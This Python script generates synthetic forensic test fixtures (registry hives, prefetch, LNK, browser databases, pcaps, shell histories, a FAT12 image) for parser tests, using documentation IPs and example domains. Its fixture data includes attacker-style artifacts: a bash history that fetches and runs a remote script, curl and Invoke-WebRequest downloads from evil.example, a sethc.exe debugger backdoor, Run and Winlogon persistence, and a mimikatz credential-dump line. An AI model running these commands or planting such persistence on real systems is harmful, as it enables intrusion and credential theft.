"""Build the synthetic Phase 6 parser fixtures into ``bin/`` (tiny, deterministic, no downloads).

    backend/.venv/Scripts/python backend/tests/fixtures/deep/make_fixtures.py

The outputs are committed; the golden tests read them. Everything is synthetic: documentation IP
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), example.* domains, fake users/SIDs.
Also used by tests (``xpress_compress``, ``build_hive``) to create variants on the fly.
"""

from __future__ import annotations

import codecs
import hashlib
import json
import sqlite3
import struct
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
BIN = HERE / "bin"
sys.path.insert(0, str(HERE))

from regwriter import RegKey, build_hive  # noqa: E402

# 2026-01-02 10:00:00 UTC and friends, as FILETIME / Unix
UNIX_BASE = 1767348000
FT_EPOCH_DELTA = 11644473600


def ft(unix: int) -> int:
    return (unix + FT_EPOCH_DELTA) * 10_000_000


def u16s(text: str) -> bytes:
    return text.encode("utf-16-le")


# ---------------------------------------------------------------------- registry hives


def system_hive() -> bytes:
    root = RegKey("ROOT", ft(UNIX_BASE))
    root.key("Select", ft(UNIX_BASE)).dword("Current", 1)
    root.key("ControlSet001\\Control", ft(UNIX_BASE))
    root.key("Setup", ft(UNIX_BASE))
    svc = root.key("ControlSet001\\Services\\EvilSvc", ft(UNIX_BASE + 60))
    svc.sz("ImagePath", "C:\\Users\\Public\\evil.exe -k").dword("Start", 2).dword("Type", 0x10)
    svc.sz("ObjectName", "LocalSystem").sz("DisplayName", "Evil Updater")
    tcp = root.key("ControlSet001\\Services\\Tcpip", ft(UNIX_BASE - 86400))
    tcp.sz("ImagePath", "\\SystemRoot\\System32\\drivers\\tcpip.sys").dword("Start", 0).dword(
        "Type", 1
    )
    root.key("ControlSet001\\Services\\EmptyKey", ft(UNIX_BASE))  # no values: skipped record
    usb = root.key(
        "ControlSet001\\Enum\\USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer&Rev_1.00\\4C530001",
        ft(UNIX_BASE + 120),
    )
    usb.sz("FriendlyName", "SanDisk Cruzer USB Device")
    props = usb.key("Properties\\{83da6326-97a6-4088-9453-a1923f573b29}", ft(UNIX_BASE + 120))
    props.key("0064", ft(UNIX_BASE)).binary("", struct.pack("<Q", ft(UNIX_BASE + 100)), 0x10)
    props.key("0066", ft(UNIX_BASE)).binary("", struct.pack("<Q", ft(UNIX_BASE + 110)), 0x10)
    # ShimCache (Windows 10 layout): two entries, the second without a time
    entries = b""
    for path, when in (
        ("C:\\Users\\Public\\evil.exe", ft(UNIX_BASE - 3600)),
        ("C:\\Tools\\x.exe", 0),
    ):
        p = u16s(path)
        body = struct.pack("<H", len(p)) + p + struct.pack("<QI", when, 0)
        entries += b"10ts" + struct.pack("<II", 0, len(body)) + body
    shim = b"\x34\x00\x00\x00" + b"\x00" * 0x30 + entries
    root.key("ControlSet001\\Control\\Session Manager\\AppCompatCache", ft(UNIX_BASE + 200)).binary(
        "AppCompatCache", shim
    )
    bam = root.key(
        "ControlSet001\\Services\\bam\\State\\UserSettings\\S-1-5-21-1111-2222-3333-1001",
        ft(UNIX_BASE + 300),
    )
    bam.binary(
        "\\Device\\HarddiskVolume3\\Users\\Public\\evil.exe",
        struct.pack("<QQQ", ft(UNIX_BASE + 30), 0, 0),
    )
    bam.dword("Version", 1)
    return build_hive(root, "\\REGISTRY\\MACHINE\\SYSTEM", ft(UNIX_BASE + 400))


def software_hive() -> bytes:
    root = RegKey("ROOT", ft(UNIX_BASE))
    root.key("Classes", ft(UNIX_BASE))
    run = root.key("Microsoft\\Windows\\CurrentVersion\\Run", ft(UNIX_BASE + 50))
    run.sz("Updater", '"C:\\Users\\Public\\evil.exe" -silent')
    win = root.key("Microsoft\\Windows NT\\CurrentVersion\\Winlogon", ft(UNIX_BASE + 55))
    win.sz("Shell", "explorer.exe")
    win.sz("Userinit", "C:\\Windows\\system32\\userinit.exe,C:\\Users\\Public\\evil.exe")
    root.key(
        "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
        ft(UNIX_BASE + 70),
    ).sz("Debugger", "C:\\Windows\\System32\\cmd.exe")
    root.key(
        "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe",
        ft(UNIX_BASE),
    ).dword("GlobalFlag", 0)
    zip7 = root.key("Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-Zip", ft(UNIX_BASE - 7200))
    zip7.sz("DisplayName", "7-Zip 24.08").sz("DisplayVersion", "24.08").sz(
        "Publisher", "Igor Pavlov"
    )
    zip7.sz("InstallDate", "20260101").sz("InstallLocation", "C:\\Program Files\\7-Zip\\")
    root.key("Microsoft\\Windows\\CurrentVersion\\Uninstall\\{00000000-NODISPLAY}", ft(UNIX_BASE))
    root.key("Policies", ft(UNIX_BASE))
    return build_hive(root, "\\SystemRoot\\System32\\Config\\SOFTWARE", ft(UNIX_BASE + 500))


def ntuser_hive() -> bytes:
    root = RegKey("ROOT", ft(UNIX_BASE))
    root.key("Control Panel", ft(UNIX_BASE))
    root.key("Environment", ft(UNIX_BASE))
    root.key("Software\\Microsoft\\Windows\\CurrentVersion\\Run", ft(UNIX_BASE + 10)).sz(
        "OneDriveSync", "C:\\Users\\alice\\AppData\\Local\\Temp\\sync.exe /background"
    )
    count = root.key(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\"
        "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count",
        ft(UNIX_BASE + 20),
    )
    data = bytearray(72)
    struct.pack_into("<III", data, 4, 3, 5, 12000)
    struct.pack_into("<Q", data, 60, ft(UNIX_BASE + 15))
    count.binary(codecs.encode("C:\\Users\\Public\\evil.exe", "rot13"), bytes(data))
    count.binary(codecs.encode("UEME_CTLSESSION", "rot13"), bytes(16))
    never = bytearray(72)
    struct.pack_into("<I", never, 4, 0)
    count.binary(codecs.encode("C:\\Windows\\notepad.exe", "rot13"), bytes(never))
    mru = root.key(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", ft(UNIX_BASE + 25)
    )
    mru.sz("a", "cmd /c whoami\\1").sz("b", "powershell -nop\\1").sz("MRUList", "ba")
    root.key(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", ft(UNIX_BASE + 26)
    ).sz("url1", "\\\\198.51.100.20\\share")
    root.key("Software\\Microsoft\\Internet Explorer\\TypedURLs", ft(UNIX_BASE + 27)).sz(
        "url1", "http://evil.example/login"
    ).sz("url2", "http://intranet.example/")
    root.key("Software\\Microsoft\\Internet Explorer\\TypedURLsTime", ft(UNIX_BASE + 27)).binary(
        "url1", struct.pack("<Q", ft(UNIX_BASE + 5))
    )
    return build_hive(root, "\\??\\C:\\Users\\alice\\ntuser.dat", ft(UNIX_BASE + 600))


def amcache_hive() -> bytes:
    root = RegKey("ROOT", ft(UNIX_BASE))
    sha1 = hashlib.sha1(b"evil").hexdigest()
    f = root.key("Root\\InventoryApplicationFile\\evil.exe|4a1b2c3d4e5f6a7b", ft(UNIX_BASE + 40))
    f.sz("LowerCaseLongPath", "c:\\users\\public\\evil.exe").sz("FileId", "0000" + sha1)
    f.qword("Size", 73728).sz("LinkDate", "11/14/2023 22:13:20").sz("Name", "evil.exe")
    f.sz("ProductName", "evil updater").sz("Publisher", "").sz("Version", "1.0.0.0")
    f.sz("BinaryType", "pe32_i386").sz("ProgramId", "0000f00d")
    root.key("Root\\InventoryApplicationFile\\empty|0", ft(UNIX_BASE))  # skipped
    app = root.key("Root\\InventoryApplication\\0000f00d", ft(UNIX_BASE + 41))
    app.sz("Name", "Evil Updater").sz("Version", "1.0").sz("Publisher", "Unknown")
    app.sz("InstallDate", "01/02/2026 09:59:00").sz("RootDirPath", "C:\\Users\\Public")
    drv = root.key(
        "Root\\InventoryDriverBinary\\c:/windows/system32/drivers/evil.sys", ft(UNIX_BASE + 42)
    )
    drv.sz("DriverId", "0000" + hashlib.sha1(b"driver").hexdigest()).sz("DriverName", "evil.sys")
    drv.sz("DriverCompany", "Unknown").dword("DriverSigned", 0)
    legacy = root.key(
        "Root\\File\\{11111111-2222-3333-4444-555555555555}\\1000000abc", ft(UNIX_BASE + 43)
    )
    legacy.sz("15", "C:\\Temp\\old.exe").sz("101", "0000" + hashlib.sha1(b"old").hexdigest())
    legacy.qword("17", ft(UNIX_BASE - 100))
    return build_hive(
        root, "\\??\\C:\\Windows\\AppCompat\\Programs\\Amcache.hve", ft(UNIX_BASE + 700)
    )


# ---------------------------------------------------------------------- prefetch + xpress


def xpress_compress(data: bytes) -> bytes:
    """LZXPRESS Huffman encoder for tests: literals + short repeat matches, 64 KiB blocks."""
    lengths = [0] * 512
    for s in range(254):
        lengths[s] = 8
    for s in (254, 255, 256, 257):
        lengths[s] = 9
    codes: dict[int, tuple[int, int]] = {}
    code = 0
    for bits in range(1, 16):
        for s in range(512):
            if lengths[s] == bits:
                codes[s] = (code, bits)
                code += 1
        code <<= 1
    table = bytes(lengths[2 * i] | (lengths[2 * i + 1] << 4) for i in range(256))
    out = bytearray()
    for start in range(0, max(len(data), 1), 65536):
        block = data[start : start + 65536]
        bits: list[int] = []
        i = 0
        while i < len(block):
            pos = start + i
            run = 0
            if pos > 0:
                while run < 4 and i + run < len(block) and data[pos + run] == data[pos - 1]:
                    run += 1
            if run >= 3:
                symbol, used = (257, 4) if run == 4 else (256, 3)
            else:
                symbol, used = data[pos], 1
            value, n = codes[symbol]
            bits.extend((value >> (n - 1 - k)) & 1 for k in range(n))
            i += used
        total = len(bits)
        words = 2 + max(0, -(-(total - 16) // 16))
        bits.extend([0] * (words * 16 - len(bits)))
        out += table
        for w in range(words):
            word = 0
            for b in bits[w * 16 : w * 16 + 16]:
                word = (word << 1) | b
            out += struct.pack("<H", word)
    return bytes(out)


def prefetch(version: int, exe: str, runs: list[int], run_count: int) -> bytes:
    info_size = {17: 68, 23: 156, 26: 224, 30: 224}[version]
    first_time, slots, count_at = {17: (36, 1, 60), 23: (44, 1, 68)}.get(version, (44, 8, 124))
    files = [
        "\\VOLUME{01dc0000aaaabbbb}\\WINDOWS\\SYSTEM32\\NTDLL.DLL",
        f"\\VOLUME{{01dc0000aaaabbbb}}\\USERS\\PUBLIC\\{exe}",
    ]
    strings = b"".join(u16s(f) + b"\x00\x00" for f in files)
    strings_off = 84 + info_size
    volumes_off = strings_off + len(strings)
    entry_size = 40 if version == 17 else 104
    device = u16s("\\VOLUME{01dc0000aaaabbbb}")
    volume = bytearray(entry_size)
    struct.pack_into(
        "<IIQI", volume, 0, entry_size, len(device) // 2, ft(UNIX_BASE - 10**6), 0x1234ABCD
    )
    volumes = bytes(volume) + device + b"\x00\x00"
    total = volumes_off + len(volumes)
    buf = bytearray(total)
    struct.pack_into("<I4sI", buf, 0, version, b"SCCA", 0x11)
    struct.pack_into("<I", buf, 12, total)
    name = u16s(exe)[:58]
    buf[16 : 16 + len(name)] = name
    struct.pack_into("<I", buf, 76, 0x1A2B3C4D)
    info = 84
    struct.pack_into("<IIII", buf, info, strings_off, 0, strings_off, 0)
    struct.pack_into("<II", buf, info + 16, strings_off, len(strings))
    struct.pack_into("<III", buf, info + 24, volumes_off, 1, len(volumes))
    for slot in range(slots):
        when = runs[slot] if slot < len(runs) else 0
        struct.pack_into("<Q", buf, info + first_time + slot * 8, ft(when) if when else 0)
    struct.pack_into("<I", buf, info + count_at, run_count)
    buf[strings_off:volumes_off] = strings
    buf[volumes_off:] = volumes
    return bytes(buf)


def mam(data: bytes) -> bytes:
    return b"MAM\x04" + struct.pack("<I", len(data)) + xpress_compress(data)


# ---------------------------------------------------------------------- LNK


def lnk() -> bytes:
    flags = (
        0x02 | 0x08 | 0x10 | 0x20 | 0x80
    )  # LinkInfo, RelativePath, WorkingDir, Arguments, Unicode
    header = bytearray(76)
    struct.pack_into(
        "<I16sII", header, 0, 0x4C, bytes.fromhex("0114020000000000c000000000000046"), flags, 0x20
    )
    struct.pack_into("<QQQ", header, 28, ft(UNIX_BASE - 5000), ft(UNIX_BASE - 100), 0)
    struct.pack_into("<IiI", header, 52, 73728, 0, 1)
    label = b"OS\x00"
    volume_id = struct.pack("<IIII", 16 + len(label), 3, 0x1234ABCD, 16) + label
    base_path = b"C:\\Users\\Public\\evil.exe\x00"
    suffix = b"\x00"
    li_header = 0x1C
    vol_off = li_header
    base_off = vol_off + len(volume_id)
    suffix_off = base_off + len(base_path)
    size = suffix_off + len(suffix)
    link_info = (
        struct.pack("<IIIIIII", size, li_header, 1, vol_off, base_off, 0, suffix_off)
        + volume_id
        + base_path
        + suffix
    )

    def sd(text: str) -> bytes:
        return struct.pack("<H", len(text)) + u16s(text)

    strings = (
        sd("..\\..\\..\\Public\\evil.exe")
        + sd("C:\\Users\\Public")
        + sd("-silent -connect 203.0.113.50")
    )
    tracker = struct.pack("<IIII", 0x60, 0xA0000003, 0x58, 0) + b"desktop-01".ljust(16, b"\x00")
    tracker += bytes(range(16)) + bytes(range(16, 32)) + bytes(range(16)) + bytes(range(16, 32))
    return bytes(header) + link_info + strings + tracker + b"\x00\x00\x00\x00"


# ---------------------------------------------------------------------- browsers


def webkit(unix: int) -> int:
    return (unix + FT_EPOCH_DELTA) * 1_000_000


def chrome_history(path: Path) -> None:
    path.unlink(missing_ok=True)
    conn = sqlite3.connect(path)
    conn.executescript(
        """
        PRAGMA page_size=4096;
        CREATE TABLE urls(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR,
            visit_count INTEGER, typed_count INTEGER, last_visit_time INTEGER, hidden INTEGER);
        CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER, visit_time INTEGER,
            from_visit INTEGER, transition INTEGER, segment_id INTEGER, visit_duration INTEGER);
        CREATE TABLE downloads(id INTEGER PRIMARY KEY, guid VARCHAR, current_path LONGVARCHAR,
            target_path LONGVARCHAR, start_time INTEGER, received_bytes INTEGER,
            total_bytes INTEGER, state INTEGER, danger_type INTEGER, interrupt_reason INTEGER,
            end_time INTEGER, opened INTEGER, tab_url VARCHAR, mime_type VARCHAR);
        CREATE TABLE downloads_url_chains(id INTEGER, chain_index INTEGER, url LONGVARCHAR);
        CREATE TABLE keyword_search_terms(keyword_id INTEGER, url_id INTEGER, term LONGVARCHAR,
            normalized_term LONGVARCHAR);
        CREATE VIEW decoy AS SELECT 1;
        """
    )
    conn.executemany(
        "INSERT INTO urls VALUES (?,?,?,?,?,?,?)",
        [
            (1, "https://evil.example/payload.exe", "Download", 1, 0, webkit(UNIX_BASE - 600), 0),
            (
                2,
                "https://search.example/?q=psexec",
                "psexec - Search",
                1,
                1,
                webkit(UNIX_BASE - 900),
                0,
            ),
        ],
    )
    conn.executemany(
        "INSERT INTO visits VALUES (?,?,?,?,?,?,?)",
        [
            (1, 2, webkit(UNIX_BASE - 900), 0, 0x30000001, 0, 5_000_000),
            (2, 1, webkit(UNIX_BASE - 600), 1, 0x00000000, 0, 0),
            (3, 1, 0, 0, 0, 0, 0),
        ],
    )
    conn.execute(
        "INSERT INTO downloads VALUES (1, 'g', 'C:\\Users\\alice\\Downloads\\payload.exe', "
        "'C:\\Users\\alice\\Downloads\\payload.exe', ?, 73728, 73728, 1, 0, 0, ?, 0, "
        "'https://evil.example/', 'application/octet-stream')",
        (webkit(UNIX_BASE - 590), webkit(UNIX_BASE - 585)),
    )
    conn.execute(
        "INSERT INTO downloads_url_chains VALUES (1, 0, 'https://evil.example/payload.exe')"
    )
    conn.execute("INSERT INTO keyword_search_terms VALUES (2, 2, 'psexec', 'psexec')")
    conn.commit()
    conn.execute("VACUUM")
    conn.close()


def firefox_places(path: Path) -> None:
    path.unlink(missing_ok=True)
    conn = sqlite3.connect(path)
    conn.executescript(
        """
        PRAGMA page_size=4096;
        CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR,
            visit_count INTEGER);
        CREATE TABLE moz_historyvisits(id INTEGER PRIMARY KEY, place_id INTEGER,
            visit_date INTEGER, visit_type INTEGER, from_visit INTEGER);
        CREATE TABLE moz_anno_attributes(id INTEGER PRIMARY KEY, name VARCHAR);
        CREATE TABLE moz_annos(id INTEGER PRIMARY KEY, place_id INTEGER,
            anno_attribute_id INTEGER, content LONGVARCHAR, dateAdded INTEGER);
        """
    )
    conn.executemany(
        "INSERT INTO moz_places VALUES (?,?,?,?)",
        [(1, "http://evil.example/tool.zip", "tool", 1), (2, "https://docs.example/", "Docs", 3)],
    )
    conn.executemany(
        "INSERT INTO moz_historyvisits VALUES (?,?,?,?,?)",
        [
            (1, 2, (UNIX_BASE - 1200) * 1_000_000, 2, 0),
            (2, 1, (UNIX_BASE - 1100) * 1_000_000, 1, 1),
        ],
    )
    conn.execute("INSERT INTO moz_anno_attributes VALUES (1, 'downloads/destinationFileURI')")
    conn.execute(
        "INSERT INTO moz_annos VALUES (1, 1, 1, 'file:///home/bob/Downloads/tool.zip', ?)",
        ((UNIX_BASE - 1090) * 1_000_000,),
    )
    conn.commit()
    conn.execute("VACUUM")
    conn.close()


# ---------------------------------------------------------------------- pcap


def pcap_files() -> tuple[bytes, bytes]:
    import io

    import dpkt

    def eth(ip: dpkt.Packet) -> bytes:
        return bytes(
            dpkt.ethernet.Ethernet(
                src=b"\x02\x00\x00\x00\x00\x01",
                dst=b"\x02\x00\x00\x00\x00\x02",
                type=0x0800,
                data=ip,
            )
        )

    def ip4(src: str, dst: str, p: int, data: dpkt.Packet) -> dpkt.ip.IP:
        pkt = dpkt.ip.IP(
            src=bytes(map(int, src.split("."))), dst=bytes(map(int, dst.split("."))), p=p, data=data
        )
        pkt.len = len(bytes(pkt))
        return pkt

    client, web, dns_srv = "192.0.2.10", "203.0.113.10", "198.51.100.53"
    frames: list[tuple[float, bytes]] = []
    t = float(UNIX_BASE)
    syn = dpkt.tcp.TCP(sport=49152, dport=80, flags=dpkt.tcp.TH_SYN, seq=1)
    frames.append((t, eth(ip4(client, web, 6, syn))))
    get = dpkt.tcp.TCP(
        sport=49152,
        dport=80,
        flags=dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
        data=b"GET /payload.exe HTTP/1.1\r\nHost: evil.example\r\nUser-Agent: curl/8.0\r\n\r\n",
    )
    frames.append((t + 0.25, eth(ip4(client, web, 6, get))))
    ack = dpkt.tcp.TCP(sport=80, dport=49152, flags=dpkt.tcp.TH_ACK)
    frames.append((t + 0.5, eth(ip4(web, client, 6, ack))))
    query = dpkt.dns.DNS(
        id=0x1234, qr=dpkt.dns.DNS_Q, qd=[dpkt.dns.DNS.Q(name="evil.example", type=1)]
    )
    frames.append(
        (
            t + 1,
            eth(ip4(client, dns_srv, 17, dpkt.udp.UDP(sport=53000, dport=53, data=bytes(query)))),
        )
    )
    answer = dpkt.dns.DNS(
        id=0x1234,
        qr=dpkt.dns.DNS_R,
        qd=[dpkt.dns.DNS.Q(name="evil.example", type=1)],
        an=[dpkt.dns.DNS.RR(name="evil.example", type=1, rdata=bytes([203, 0, 113, 10]), ttl=60)],
    )
    frames.append(
        (
            t + 1.1,
            eth(ip4(dns_srv, client, 17, dpkt.udp.UDP(sport=53, dport=53000, data=bytes(answer)))),
        )
    )
    sni = b"c2.example"
    ext = struct.pack(">HHHBH", 0, len(sni) + 5, len(sni) + 3, 0, len(sni)) + sni
    hello = (
        b"\x03\x03"
        + bytes(32)
        + b"\x00"
        + b"\x00\x02\x13\x01"
        + b"\x01\x00"
        + struct.pack(">H", len(ext))
        + ext
    )
    handshake = b"\x01" + len(hello).to_bytes(3, "big") + hello
    record = b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake
    tls = dpkt.tcp.TCP(
        sport=49153, dport=443, flags=dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH, data=record
    )
    frames.append((t + 2, eth(ip4(client, "203.0.113.20", 6, tls))))
    arp = bytes(
        dpkt.ethernet.Ethernet(src=b"\x02" * 6, dst=b"\xff" * 6, type=0x0806, data=b"\x00" * 28)
    )
    frames.append((t + 3, arp))
    frames.append(
        (t + 4, b"\x02\x00\x00\x00\x00\x02\x02\x00\x00\x00\x00\x01\x08\x00\x45")
    )  # truncated IP

    out = io.BytesIO()
    writer = dpkt.pcap.Writer(out, snaplen=65535, linktype=dpkt.pcap.DLT_EN10MB)
    for ts, frame in frames:
        writer.writepkt(frame, ts=ts)
    classic = out.getvalue()
    out_ng = io.BytesIO()
    writer_ng = dpkt.pcapng.Writer(out_ng, snaplen=65535, linktype=dpkt.pcap.DLT_EN10MB)
    for ts, frame in frames[:2]:
        writer_ng.writepkt(frame, ts=ts)
    return classic, out_ng.getvalue()


# ---------------------------------------------------------------------- PE


def pe_file() -> bytes:
    """Tiny PE32 with UPX-named sections and imports of kernel32 (injection APIs)."""
    file_align, sect_align = 0x200, 0x1000
    rva = 0x2000  # UPX1 holds the import data
    dll = b"KERNEL32.dll\x00"
    names = [b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread"]
    hint_names = b""
    hint_rvas = []
    base = 0x40  # hint/name table offset inside the section
    for n in names:
        hint_rvas.append(rva + base + len(hint_names))
        entry = b"\x00\x00" + n + b"\x00"
        entry += b"\x00" * (len(entry) % 2)
        hint_names += entry
    ilt_off = base + len(hint_names)
    ilt = b"".join(struct.pack("<I", r) for r in hint_rvas) + b"\x00\x00\x00\x00"
    iat_off = ilt_off + len(ilt)
    dll_off = iat_off + len(ilt)
    desc = struct.pack("<IIIII", rva + ilt_off, 0, 0, rva + dll_off, rva + iat_off) + bytes(20)
    section = bytearray(file_align)
    section[0 : len(desc)] = desc
    section[base : base + len(hint_names)] = hint_names
    section[ilt_off : ilt_off + len(ilt)] = ilt
    section[iat_off : iat_off + len(ilt)] = ilt
    section[dll_off : dll_off + len(dll)] = dll
    headers = bytearray(file_align)
    headers[0:2] = b"MZ"
    struct.pack_into("<I", headers, 0x3C, 0x40)
    headers[0x40:0x44] = b"PE\x00\x00"
    coff = 0x44
    struct.pack_into("<HHIIIHH", headers, coff, 0x14C, 2, 1700000000, 0, 0, 0xE0, 0x0102)
    opt = coff + 20
    struct.pack_into(
        "<HBBIIIIIIIIIHHHHHHIIIIHHIIII",
        headers,
        opt,
        0x10B,
        14,
        0,
        file_align,
        0,
        0x1000,
        rva,
        rva,
        0x1000,
        0x400000,
        sect_align,
        file_align,
        6,
        0,
        0,
        0,
        6,
        0,
        0,
        0x3000,
        file_align,
        0,
        3,
        0,
        0x100000,
        0x1000,
        0x100000,
        0x1000,
    )
    struct.pack_into("<II", headers, opt + 88, 0, 16)
    dirs = opt + 96
    struct.pack_into("<II", headers, dirs + 8, rva, len(desc))  # import directory
    sec = opt + 0xE0
    struct.pack_into(
        "<8sIIIIIIHHI", headers, sec, b"UPX0", 0x1000, 0x1000, 0, 0, 0, 0, 0, 0, 0xE0000080
    )
    struct.pack_into(
        "<8sIIIIIIHHI",
        headers,
        sec + 40,
        b"UPX1",
        0x1000,
        rva,
        file_align,
        file_align,
        0,
        0,
        0,
        0,
        0xE0000040,
    )
    return bytes(headers) + bytes(section)


# ---------------------------------------------------------------------- Linux


def utmp(
    ut_type: int, pid: int, line: str, user: str, host: str, sec: int, addr: bytes = b""
) -> bytes:
    return struct.pack(
        "<h2xi32s4s32s256shhiii16s20s",
        ut_type,
        pid,
        line.encode(),
        line[-4:].encode(),
        user.encode(),
        host.encode(),
        0,
        0,
        0,
        sec,
        0,
        addr.ljust(16, b"\x00"),
        b"",
    )


def fat12_image() -> bytes:
    """64 KiB FAT12 volume: README.TXT and a deleted EVIL.EXE (for the live Sleuth Kit smoke)."""
    sectors = 128
    img = bytearray(sectors * 512)
    boot = bytearray(512)
    boot[0:3] = b"\xeb\x3c\x90"
    boot[3:11] = b"MSDOS5.0"
    struct.pack_into("<HBHBHHBHHHII", boot, 11, 512, 1, 1, 2, 16, sectors, 0xF8, 1, 32, 2, 0, 0)
    struct.pack_into("<BBBI11s8s", boot, 36, 0x80, 0, 0x29, 0x1234ABCD, b"DFIRBENCH  ", b"FAT12   ")
    boot[510:512] = b"\x55\xaa"
    img[0:512] = boot
    fat = bytearray(512)
    fat[0:3] = b"\xf8\xff\xff"
    fat[3:6] = b"\xff\x0f\x00"  # cluster 2 = EOF, cluster 3 = free (deleted file)
    img[512:1024] = fat
    img[1024:1536] = fat
    # 2026-01-02 10:00:00 local -> DOS date/time
    dtime = (10 << 11) | (0 << 5) | 0
    ddate = ((2026 - 1980) << 9) | (1 << 5) | 2
    root = bytearray(512)
    struct.pack_into(
        "<11sBBBHHHHHHHI",
        root,
        0,
        b"README  TXT",
        0x20,
        0,
        0,
        dtime,
        ddate,
        ddate,
        0,
        dtime,
        ddate,
        2,
        20,
    )
    struct.pack_into(
        "<11sBBBHHHHHHHI",
        root,
        32,
        b"\xe5VIL    EXE",
        0x20,
        0,
        0,
        dtime,
        ddate,
        ddate,
        0,
        dtime + 32,
        ddate,
        3,
        5,
    )
    img[1536:2048] = root
    data = 1536 + 512  # first data sector = cluster 2
    img[data : data + 20] = b"hello from dfirbench"
    img[data + 512 : data + 517] = b"MZ..."
    return bytes(img)


def main() -> None:
    BIN.mkdir(exist_ok=True)
    files: dict[str, bytes] = {
        "SYSTEM": system_hive(),
        "SOFTWARE": software_hive(),
        "NTUSER.DAT": ntuser_hive(),
        "Amcache.hve": amcache_hive(),
        "EVIL.EXE-1A2B3C4D.pf": prefetch(30, "EVIL.EXE", [UNIX_BASE + 30, UNIX_BASE - 3600], 2),
        "XPTOOL.EXE-0BADF00D.pf": prefetch(17, "XPTOOL.EXE", [UNIX_BASE - 86400], 7),
        "evil.lnk": lnk(),
        "sample.exe": pe_file(),
        "eicar_mimikatz.txt": (
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n"
            b"mimikatz # sekurlsa::logonpasswords\nby gentilkiwi\n"
        ),
        "wtmp": b"".join(
            [
                utmp(2, 0, "~", "reboot", "6.8.0-dfir", UNIX_BASE - 7200),
                utmp(
                    7,
                    4242,
                    "pts/0",
                    "alice",
                    "198.51.100.7",
                    UNIX_BASE - 3600,
                    bytes([198, 51, 100, 7]),
                ),
                utmp(8, 4242, "pts/0", "", "", UNIX_BASE - 1800),
                utmp(0, 0, "", "", "", 0),
                utmp(1, 0, "~~", "shutdown", "6.8.0-dfir", UNIX_BASE - 60),
            ]
        ),
        "btmp": utmp(
            7,
            5000,
            "ssh:notty",
            "admin",
            "203.0.113.66",
            UNIX_BASE - 4000,
            bytes([203, 0, 113, 66]),
        ),
        ".bash_history": (
            f"#{UNIX_BASE - 500}\nwget http://203.0.113.9/x.sh\n#{UNIX_BASE - 490}\nbash x.sh\n\nls -la\n"
        ).encode(),
        ".zsh_history": f": {UNIX_BASE - 300}:0;curl -s http://evil.example/\n: 99999999999999:0;bad\n".encode(),
        "ConsoleHost_history.txt": b"Get-Process\r\nInvoke-WebRequest http://evil.example/a.ps1 -OutFile a.ps1\r\n",
        "journal.json": "\n".join(
            [
                json.dumps(
                    {
                        "__REALTIME_TIMESTAMP": str((UNIX_BASE - 50) * 1_000_000),
                        "_HOSTNAME": "web01",
                        "SYSLOG_IDENTIFIER": "sshd",
                        "_PID": "812",
                        "MESSAGE": "Accepted publickey for alice from 198.51.100.7 port 50022 ssh2: ED25519 SHA256:x",
                        "_SYSTEMD_UNIT": "ssh.service",
                    }
                ),
                json.dumps(
                    {
                        "__REALTIME_TIMESTAMP": str((UNIX_BASE - 40) * 1_000_000),
                        "_HOSTNAME": "web01",
                        "SYSLOG_IDENTIFIER": "kernel",
                        "MESSAGE": list(b"usb 1-1: new high-speed USB device"),
                    }
                ),
                "{not json",
                json.dumps({"_HOSTNAME": "web01", "MESSAGE": "no time"}),
            ]
        ).encode()
        + b"\n",
        "fat12.img": fat12_image(),
    }
    files["EVIL.EXE-MAM.pf"] = mam(files["EVIL.EXE-1A2B3C4D.pf"])
    classic, ng = pcap_files()
    files["capture.pcap"] = classic
    files["capture.pcapng"] = ng
    for name, data in files.items():
        (BIN / name).write_bytes(data)
    chrome_history(BIN / "History")
    firefox_places(BIN / "places.sqlite")
    print(f"wrote {len(files) + 2} fixtures to {BIN}")


if __name__ == "__main__":
    main()
